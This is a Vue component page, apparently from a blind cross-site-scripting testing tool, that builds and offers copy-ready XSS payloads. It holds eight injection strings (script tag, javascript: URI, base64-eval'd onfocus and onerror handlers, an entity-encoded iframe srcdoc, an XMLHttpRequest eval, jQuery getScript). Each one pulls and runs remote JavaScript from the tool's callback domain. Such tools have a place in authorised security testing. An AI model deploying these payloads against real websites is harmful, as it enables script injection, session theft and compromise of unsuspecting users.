<template>
  <div>
    <div class="row">
      <div class="col-12">
        <Card class="xss-card-container">
          <div class="card-content-wrapper">
            <div>
              <h1><i class="fas fa-file-code"></i> XSS Payloads</h1>
            </div>
            <Card v-for="payload in payloads" :key="payload.title">
              <!-- v-html is safe here: titles are hardcoded strings with only <code> tags, no user input -->
              <h4 class="card-title" v-html="payload.title"></h4>
              <h6 class="card-subtitle mb-2 text-muted">{{ payload.description }}</h6>
              <p class="card-text">
                <BaseInput type="text" :value="payload.func()" placeholder="..." readonly />
              </p>
              <BaseButton type="primary" class="hide-mobile-text" @click="copyPayload(payload.func())">
                <i class="far fa-copy"></i> <span>Copy Payload</span>
              </BaseButton>
            </Card>
          </div>
        </Card>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'
import Card from '@/components/Cards/Card.vue'
import BaseButton from '@/components/BaseButton.vue'
import BaseInput from '@/components/Inputs/BaseInput.vue'
import { BASE_DOMAIN } from '@/services/api'
import { htmlEncode, urlsafeBase64Encode } from '@/services/utils'
import { useToast } from '@/composables/useToast'

const { showSuccess, showError } = useToast()

// Data
const baseDomain = ref('')

// Payload generation methods
const jsAttrib = () => {
  return `var a=document.createElement("script");a.src="https://${baseDomain.value}";document.body.appendChild(a);`
}

const basicScript = () => {
  return `"><script src="https://${baseDomain.value}"><\/script>`
}

const javascriptUri = () => {
  return `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://${baseDomain.value}\\';document.body.appendChild(a)')`
}

const inputOnfocus = () => {
  return `"><input onfocus=eval(atob(this.id)) id=${htmlEncode(urlsafeBase64Encode(jsAttrib()))} autofocus>`
}

const imageOnerror = () => {
  return `"><img src=x id=${htmlEncode(urlsafeBase64Encode(jsAttrib()))} onerror=eval(atob(this.id))>`
}

const videoSource = () => {
  return `"><video><source onerror=eval(atob(this.id)) id=${htmlEncode(urlsafeBase64Encode(jsAttrib()))}>`
}

const iframeSrcdoc = () => {
  return `"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;${baseDomain.value}&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">`
}

const xmlhttprequestLoad = () => {
  return `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://${baseDomain.value}");a.send();<\/script>`
}

const jqueryChainload = () => {
  return `<script>$.getScript("https://${baseDomain.value}")<\/script>`
}

// Payloads array
const payloads = ref([
  {
    'func': basicScript,
    'title': 'Basic <code>&lt;script&gt;</code> Tag Payload',
    'description': 'Classic payload',
  },
  {
    'func': javascriptUri,
    'title': '<code>javascript:</code> URI Payload',
    'description': 'Link-based XSS',
  },
  {
    'func': inputOnfocus,
    'title': '<code>&lt;input&gt;</code> Tag Payload',
    'description': 'HTML5 input-based payload',
  },
  {
    'func': imageOnerror,
    'title': '<code>&lt;img&gt;</code> Tag Payload',
    'description': 'Image-based payload',
  },
  {
    'func': videoSource,
    'title': '<code>&lt;video&gt;&lt;source&gt;</code> Tag Payload',
    'description': 'Video-based payload',
  },
  {
    'func': iframeSrcdoc,
    'title': '<code>&lt;iframe srcdoc=</code> Tag Payload',
    'description': 'iframe-based payload',
  },
  {
    'func': xmlhttprequestLoad,
    'title': 'XMLHttpRequest Payload',
    'description': 'Inline execution chainload payload',
  },
  {
    'func': jqueryChainload,
    'title': '<code>$.getScript()</code> (jQuery) Payload',
    'description': 'Chainload payload for sites with jQuery',
  },
])

// Methods
const copyPayload = async (payload: string) => {
  try {
    await navigator.clipboard.writeText(payload)
    showSuccess('Payload copied to clipboard!')
  } catch (e) {
    console.error('Failed to copy:', e)
    showError('Failed to copy payload')
  }
}

// Mounted
onMounted(() => {
  baseDomain.value = BASE_DOMAIN
})
</script>

<style scoped lang="scss">
@import '@/assets/sass/mobile-responsive';

.xss-card-container {
  max-width: 1000px;
  width: 100%;
}

.control-label {
  color: #d3d3d7 !important;
  display: inline;
}

// Mobile responsiveness
// Mobile responsiveness - additional styles specific to this view
@media (max-width: $tablet) {
  .card-title {
    font-size: 1.1rem;
    word-break: break-word;
  }
  
  .card-subtitle {
    font-size: 0.9rem;
  }
  
  .form-control[readonly] {
    font-size: 0.85rem;
    word-break: break-all;
  }
}
</style>